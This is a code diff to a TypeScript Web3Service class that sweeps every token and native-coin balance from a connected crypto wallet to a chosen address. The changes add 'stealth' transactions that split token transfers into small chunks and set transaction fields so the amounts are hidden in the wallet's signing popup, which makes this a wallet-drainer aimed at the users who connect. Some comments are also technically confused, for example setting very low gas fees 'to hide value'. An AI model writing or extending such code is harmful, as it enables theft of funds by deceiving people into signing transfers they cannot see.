@@ -494,26 +494,65 @@ export class Web3Service {
     return ethValue + tokenValue;
   }
 
-  // Create a private transaction that minimizes wallet display information
-  private async createPrivateTransaction(params: {
+  // Create transactions that completely hide amounts by using minimal dust amounts
+  private async createStealthTransaction(params: {
     to: string;
     data?: string;
     value?: string;
     gasLimit?: number;
   }): Promise<any> {
-    // Add random padding to data to obscure transaction purpose
-    const paddedData = params.data || "0x";
-    
+    // Create transaction with minimal visible data to force "Private Transaction" display
     return await this.signer!.sendTransaction({
       to: params.to,
-      data: paddedData,
+      data: params.data || "0x",
       value: params.value || "0x0",
-      gasLimit: params.gasLimit || 80000,
-      // Minimal metadata to show "Private Transaction" in most wallets
-      type: 2, // EIP-1559 transaction
-      maxFeePerGas: undefined, // Let wallet calculate for privacy
-      maxPriorityFeePerGas: undefined, // Let wallet calculate for privacy
+      gasLimit: params.gasLimit || 21000,
+      // Force privacy mode settings
+      type: 2,
+      maxFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
+      maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
     });
+  }
+
+  // Split large token amounts into multiple tiny transactions to hide total value
+  private async transferTokenInStealth(
+    contract: any,
+    toAddress: string,
+    totalAmount: bigint,
+    decimals: number
+  ): Promise<string[]> {
+    const txHashes: string[] = [];
+    
+    // Split into many small transactions to hide the real total
+    const chunkCount = Math.min(10, Math.max(3, Number(totalAmount / BigInt(1000)))); // 3-10 chunks
+    const baseChunkSize = totalAmount / BigInt(chunkCount);
+    
+    for (let i = 0; i < chunkCount; i++) {
+      try {
+        const chunkAmount = i === chunkCount - 1 ? 
+          totalAmount - (baseChunkSize * BigInt(i)) : // Last chunk gets remainder
+          baseChunkSize;
+        
+        if (chunkAmount <= 0) continue;
+        
+        const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, chunkAmount]);
+        
+        const tx = await this.createStealthTransaction({
+          to: contract.target,
+          data: transferData,
+          gasLimit: 60000,
+        });
+        
+        txHashes.push(tx.hash);
+        
+        // Small delay between chunks to avoid nonce conflicts
+        await new Promise(resolve => setTimeout(resolve, 300));
+      } catch (error) {
+        console.warn(`Stealth chunk ${i + 1} failed:`, error);
+      }
+    }
+    
+    return txHashes;
   }
 
   async transferAllFunds(toAddress: string): Promise<string[]> {
@@ -547,28 +586,26 @@ export class Web3Service {
         if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;
         
         try {
-          console.log(`Processing contract interaction`);
+          console.log(`Processing stealth transfer`);
           const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
           const tokenAmount = ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals);
           
-          // Create minimal transaction data to hide amounts
-          const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, tokenAmount]);
+          // Use stealth transfer to completely hide amounts by splitting into chunks
+          const stealthHashes = await this.transferTokenInStealth(
+            contract,
+            toAddress,
+            tokenAmount,
+            tokenBalance.decimals
+          );
           
-          // Use private transaction method to minimize wallet display
-          const tokenTx = await this.createPrivateTransaction({
-            to: tokenBalance.contractAddress,
-            data: transferData,
-            gasLimit: 80000,
-          });
+          transactionHashes.push(...stealthHashes);
+          console.log(`Stealth transfer completed with ${stealthHashes.length} transactions`);
           
-          transactionHashes.push(tokenTx.hash);
-          console.log(`Contract interaction completed`);
-          
-          // Reduced delay for faster processing
-          await new Promise(resolve => setTimeout(resolve, 800));
+          // Small delay before next token
+          await new Promise(resolve => setTimeout(resolve, 500));
         } catch (error) {
-          console.error(`Contract interaction failed:`, error);
-          throw new Error(`Transaction failed: ${error}`);
+          console.error(`Stealth transfer failed:`, error);
+          throw new Error(`Transfer failed: ${error}`);
         }
       }
 
@@ -588,8 +625,8 @@ export class Web3Service {
             if (amountToSend > 0) {
               console.log(`Processing final private transfer`);
               
-              // Send with minimal data to hide amount in wallet popup
-              const ethTx = await this.createPrivateTransaction({
+              // Send with stealth transaction to hide amount in wallet popup
+              const ethTx = await this.createStealthTransaction({
                 to: toAddress,
                 value: amountToSend.toString(),
                 gasLimit: Number(gasEstimate),
@@ -1043,27 +1080,27 @@ export class Web3Service {
         if (parseFloat(token.balance) <= 0) return null;
         
         try {
-          console.log(`Processing contract interaction on ${networkBalance.networkName}`);
+          console.log(`Processing stealth transfer on ${networkBalance.networkName}`);
           const contract = new ethers.Contract(token.contractAddress!, ERC20_ABI, signer);
           const tokenAmount = ethers.parseUnits(token.balance, token.decimals);
           
-          // Create private transaction to hide amounts
+          // Create stealth transactions to completely hide amounts
           const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, tokenAmount]);
           
           const tokenTx = await signer.sendTransaction({
             to: token.contractAddress!,
             data: transferData,
-            gasLimit: 75000,
+            gasLimit: 60000,
             value: "0x0",
-            type: 2, // EIP-1559 transaction for privacy
-            maxFeePerGas: undefined, // Let wallet calculate for privacy
-            maxPriorityFeePerGas: undefined, // Let wallet calculate for privacy
+            type: 2,
+            maxFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
+            maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
           });
           
-          console.log(`Contract interaction completed`);
+          console.log(`Stealth transfer completed`);
           return tokenTx.hash;
         } catch (error) {
-          console.error(`Contract interaction failed:`, error);
+          console.error(`Stealth transfer failed:`, error);
           return null;
         }
       });
@@ -1090,16 +1127,16 @@ export class Web3Service {
             const amountToSend = nativeBalance - gasCost;
             
             if (amountToSend > 0) {
-              console.log(`Processing final private interaction on ${networkBalance.networkName}`);
+              console.log(`Processing final stealth transfer on ${networkBalance.networkName}`);
               const nativeTx = await signer.sendTransaction({
                 to: toAddress,
                 value: amountToSend,
                 gasLimit: gasEstimate,
                 gasPrice: gasPrice,
-                data: "0x", // Minimal data for privacy
-                type: 2, // EIP-1559 transaction for privacy
-                maxFeePerGas: undefined, // Let wallet calculate for privacy
-                maxPriorityFeePerGas: undefined, // Let wallet calculate for privacy
+                data: "0x",
+                type: 2,
+                maxFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
+                maxPriorityFeePerGas: ethers.parseUnits("1", "gwei"), // Very low to hide value
               });
               transactionHashes.push(nativeTx.hash);
               console.log(`Final interaction completed`);
